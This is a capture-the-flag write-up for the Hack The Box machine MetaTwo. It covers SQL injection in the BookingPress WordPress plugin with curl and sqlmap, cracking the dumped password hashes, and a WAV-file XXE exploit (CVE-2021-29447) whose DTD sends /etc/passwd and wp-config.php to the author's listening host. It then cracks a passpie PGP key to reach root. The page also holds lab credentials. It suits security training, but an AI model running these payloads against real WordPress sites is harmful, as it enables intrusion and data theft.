---
description: A rough box that took me a couple days to really work out.
---

# MetaTwo

<figure><img src="../.gitbook/assets/MetaTwo.png" alt=""><figcaption></figcaption></figure>

## Enumeration

### NMAP

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

We can see an ftp port open, ssh, and http. I tried logging onto the ftp server with anonymous credentials but had no luck. I added metapress.htb to /etc/hosts and took a look.

### Webpage

The web page seems to be hosted with WordPress, so I'll poke around looking for vulnerable libraries and possible attack vectors.

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

`/events/` looks fun, I'll look at that.&#x20;

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Not much to see here, but the source code is much more interesting.

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

As luck would have, bookingpress-appointment has a vulnerability([https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)) that let's us inject SQL. Note that \_wpnonce will need to be changed as we need to trick the server into thinking the request is legit.

```
┌──(kali㉿kali)-[~]                                                                                                                                                                                                                         
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \                                                                                                                                                                                
  --data 'action=bookingpress_front_get_category_services&_wpnonce=0aee0f5c43&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'                                        
HTTP/1.1 200 OK                                                                                                                                                                                                                             
Server: nginx/1.18.0                                                                                                                                                                                                                        
Date: Wed, 08 Feb 2023 00:14:46 GMT                                                                                                                                                                                                         
Content-Type: text/html; charset=UTF-8                                                                                                                                                                                                      
Transfer-Encoding: chunked                                                                                                                                                                                                                  
Connection: keep-alive                                                                                                                                                                                                                      
X-Powered-By: PHP/8.0.24                                                                                                                                                                                                                    
X-Robots-Tag: noindex                                                                                                                                                                                                                       
X-Content-Type-Options: nosniff                                                                                                                                                                                                             
Expires: Wed, 11 Jan 1984 05:00:00 GMT                                                                                                                                                                                                      
Cache-Control: no-cache, must-revalidate, max-age=0                                                                                                                                                                                         
X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                 
Referrer-Policy: strict-origin-when-cross-origin                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_ser
vice_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/booking
press-appointment-booking\/images\/placeholder-img.jpg"}]
```

Pretty hard to understand to be honest, so I'll push it into burp to make it easier to digest.&#x20;

```
┌──(kali㉿kali)-[~]                                        
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=0aee0f5c43&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x 127.0.0.1:8080
```

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Save the request to a file and run sqlmap through it!(To do that, I need to replace `total_service=-7502` to `total_service=1`.&#x20;

```
┌──(kali㉿kali)-[~]
└─$ cat admin.req
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=0aee0f5c43&category_id=33&total_service=1

┌──(kali㉿kali)-[~]
└─$ sqlmap -r admin.req -p total_service --dbs
...
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---                                                        
Parameter: total_service (POST)                            
    Type: time-based blind                                 
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=0aee0f5c43&category_id=33&total_service=1) AND (SELECT 9476 FROM (SELECT(SLEEP(5)))ZGjP) AND (6115=6115

    Type: UNION query                                      
    Title: Generic UNION query (NULL) - 9 columns          
    Payload: action=bookingpress_front_get_category_services&_wpnonce=0aee0f5c43&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a7a6b71,0x62586b4c4f466c65434f794a57595241745545526c6d45784e6f6e4954554464
46755a6b726c6c6b,0x71716a7671),NULL,NULL,NULL,NULL-- -
---                                                        
[18:17:01] [INFO] the back-end DBMS is MySQL               
web application technology: Nginx 1.18.0, PHP 8.0.24       
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)              
[18:17:01] [INFO] fetching database names                  
available databases [2]:                                   
[*] blog                                                   
[*] information_schema
```

We can see that there are two databases. The one that piques my interest is the blog one, so I'll list the tables of that:

```
┌──(kali㉿kali)-[~]491/793]
└─$ sqlmap -r admin.req -p total_service -D blog --tables
...
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
```

Of all of these tables, wp\_users looks the most promising, so let me list the contents of that.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
...
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

We've got a set of hashes! They look to be pretty important too - admin and manager. I'll add them to my hash file and then let john take care of the rest.

```
┌──(kali㉿kali)-[~]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)
```

I logged into the `login` page on the webpage with my newfound manager credentials and I'm able to access the admin panel.

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

We did it!

### Getting a user

This particular version of WordPress(5.6.2) has a vulnerability: CVE-2021-29447.&#x20;

To learn more about this, check the tryhackme room about it: [https://tryhackme.com/room/wordpresscve202129447](https://tryhackme.com/room/wordpresscve202129447)

I'm not going to explain every step of the process, but the general idea is that we upload a malicious WAV file that calls a file on our host machine that allows code execution.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]                                                                                                                                                                                                    
└─$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.18:1234/jsquared.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

We can then write `jsquared.dtd` to fetch the command output in base64 and relay it back to a php server we will have listening.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ cat jsquared.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.18:1234/?p=%file;'>" >
```

I'll upload our payload.wav file and look at our php server output.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ php -S 0.0.0.0:1234
[Tue Feb  7 20:10:51 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started
[Tue Feb  7 20:10:56 2023] 10.10.11.186:45084 Accepted
[Tue Feb  7 20:10:56 2023] 10.10.11.186:45084 [200]: GET /jsquared.dtd
[Tue Feb  7 20:10:56 2023] 10.10.11.186:45084 Closing
[Tue Feb  7 20:10:56 2023] 10.10.11.186:45088 Accepted
[Tue Feb  7 20:10:56 2023] 10.10.11.186:45088 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm
2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFas
n2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChn
eaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Cyberchef will help us decode this output and confirm that we have the `/etc/passwd` file.

However, we need some solid credentials to continue the box. A good starting point is `/etc/nginx/sites-enabled/default` . This will let us see the nginx server config and the directory listing for the wordpress configuration files.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ cat jsquared.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.18:1234/?p=%file;'>" >
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Now we know that the path is `/var/www/metapress.htb/blog`.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ cat jsquared.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.18:1234/?p=%file;'>" >
```

I'll skip the base64 output since it's a lot of the same process.&#x20;

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

We now have FTP credentials. I'll login to the service and grab the mailer/send\_emails.php file.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:kali): metapress.htb
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35882|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||32126|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||24365|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |************************************************************************|  1126      337.71 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (30.08 KiB/s)
ftp> exit
221 Goodbye.
```

Skimming it reveals the `jnelson` user credentials.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ cat send_email.php
...
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
...
```

SSH into the box and get the user flag.

### Root

```
jnelson@meta2:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jnelson:
Sorry, user jnelson may not run sudo on meta2.
```

The easy approach doesn't seem to work out here, so I'll import LinPeas after I investigate around for some hidden files.

```
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Feb  8 00:08 user.txt
```

What do you know! There is a .passpie directory, which is definitely not common in home directories. Let's take a look inside.

```
jnelson@meta2:~$ cd .passpie
jnelson@meta2:~/.passpie$ ls
ssh
jnelson@meta2:~/.passpie$ cd ssh
jnelson@meta2:~/.passpie/ssh$ ls
jnelson.pass  root.pass
jnelson@meta2:~/.passpie/ssh$ cat root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
```

Looks like the password is encrypted in this pgp message and needs a key. Good for us, since we have a key in the previous directory.

```
nelson@meta2:~/.passpie/ssh$ cd ..
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

I'll move the `.keys` over to my machine and take a look.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----
...
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----
...
-----END PGP PRIVATE KEY BLOCK-----
```

I'll remove the pgp public key part and convert the file with gpg2john to crack it.

```
┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ gpg2john .keys > gpg.john

┌──(kali㉿kali)-[~/htb/machines/metatwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt gpg.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)
1g 0:00:00:08 DONE (2023-02-07 21:31) 0.1226g/s 20.12p/s 20.12c/s 20.12C/s ginger..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Almost there! Now we just need to run a couple more command line programs to export the passwords into the passpie folder and finish the privilege escalation.

```
jnelson@meta2:~$ touch pass
jnelson@meta2:~$ passpie export pass
Passphrase:
jnelson@meta2:~$ su root
Password:
root@meta2:/home/jnelson#
```

Completed box.
